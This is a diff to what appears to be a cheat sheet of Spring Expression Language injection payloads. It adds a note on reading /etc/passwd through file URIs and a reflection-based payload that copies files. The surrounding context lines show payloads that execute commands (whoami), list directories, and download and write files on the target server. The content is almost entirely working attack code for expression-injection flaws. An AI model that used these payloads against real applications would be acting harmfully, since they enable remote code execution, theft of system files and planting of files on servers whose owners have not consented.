@@ -45,6 +45,9 @@ T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream().readAllBytes()
 "".getClass().forName("java.io.File").getConstructor("".getClass()).newInstance("C:/Windows").listFiles()
 ```
 
+### Notes about files
+**java.net.URI** for working with files on linux is **file:///**etc/passwd 
+
 ## Download files
 ```java
 T(java.nio.file.Files).copy(new java.net.URL("http://127.0.0.1:8888/test.txt").openStream(),"".getClass().forName("java.nio.file.Paths").getMethods()[0].invoke(null,"C:/Windows/Temp/test3.txt",new String[]{}))
@@ -84,6 +87,11 @@ T(java.nio.file.Files).write("".getClass().forName("java.nio.file.Paths").getMet
 
 T(java.nio.file.Files).write("".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/Temp/qwe.txt")), "hello".getBytes(), new java.nio.file.OpenOption[] {"".getClass().forName("java.nio.file.StandardOpenOption").getField("CREATE").get(null)})
 
+```
+
+## Copy Files
+```java
+T(java.nio.file.Files).copy("".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/Temp/qwe.txt")), "".getClass().forName("java.nio.file.Paths").getMethod("get","".getClass().forName("java.net.URI")).invoke(null,new java.net.URI("file:/C:/Windows/Temp/qwe_copy.txt")), new java.nio.file.CopyOption[] {"".getClass().forName("java.nio.file.StandardCopyOption").getField("REPLACE_EXISTING").get(null)})
 ```
 
 ## List packages
